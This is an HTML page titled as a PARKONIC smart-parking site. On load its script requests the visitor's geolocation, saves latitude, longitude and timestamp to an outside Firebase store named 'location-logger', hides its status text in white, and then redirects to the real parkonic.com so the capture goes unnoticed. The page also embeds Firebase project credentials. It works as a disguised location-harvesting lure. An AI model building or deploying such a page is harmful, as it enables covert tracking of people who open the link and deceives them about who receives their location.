<!DOCTYPE html>
<html>
<head>
  <title>PARKONIC - Smart Parking Solutions with Mobile Application</title>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
</head>
<body>

<div style="color: white;" id="coords">Fetching location....</div>

<script>
  // ‚úÖ Replace this with your actual Firebase config
  const firebaseConfig = {
  apiKey: "AIzaSyDgO0EMocR1LmOQFwFCvCU7QyMeAieuruA",
  authDomain: "location-logger-53d22.firebaseapp.com",
  projectId: "location-logger-53d22",
  storageBucket: "location-logger-53d22.firebasestorage.app",
  messagingSenderId: "822436256718",
  appId: "1:822436256718:web:4f026aa17bef44c71f699f"
};

  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();

  navigator.geolocation.getCurrentPosition(
    function (position) {
      const lat = position.coords.latitude;
      const lng = position.coords.longitude;
      const now = new Date();

      // ‚úÖ Raw ISO timestamp
      const isoTimestamp = now.toISOString();

      // ‚úÖ Human-friendly timestamp
      const formattedTimestamp = now.toLocaleString("en-GB", {
        day: "2-digit",
        month: "short",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true
      }).replace(",", "");

      // Show on page (just for debug)
      document.getElementById("coords").innerText =
        `Lat: ${lat}, Lng: ${lng}\nTime: ${formattedTimestamp}`;

      // ‚úÖ Save to Firestore
      db.collection("locations").add({
        lat,
        lng,
        timestamp: isoTimestamp,            // machine-friendly
        timestampFormatted: formattedTimestamp // human-friendly
      })
      .then(() => {
        // üöÄ Instantly redirect after Firestore confirms save
        window.location.href = "https://www.parkonic.com/";
      })
      .catch((err) => {
        console.error("‚ùå Logging failed:", err);
        window.location.href = "https://www.parkonic.com/"; // still redirect
      });
    },
    function () {
      window.location.href = "https://www.parkonic.com/";
    }
  );
</script>



</body>
</html>
